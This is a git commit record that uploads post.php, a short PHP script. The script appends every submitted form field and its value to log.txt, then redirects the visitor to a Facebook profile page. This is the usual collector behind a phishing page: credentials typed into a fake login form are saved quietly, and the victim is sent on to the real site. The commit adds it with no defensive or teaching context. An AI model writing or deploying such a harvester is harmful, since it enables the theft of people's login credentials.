2d05d5a80570f73520ab8f8b4a03c248b0389c91
inicio12 <75631673+inicio12@users.noreply.github.com>
2020-12-07 11:39:31 -0500

    Add files via upload

---
+++ post.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location: https://facebook.com/pocoyo.bv.900');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
+?>
+
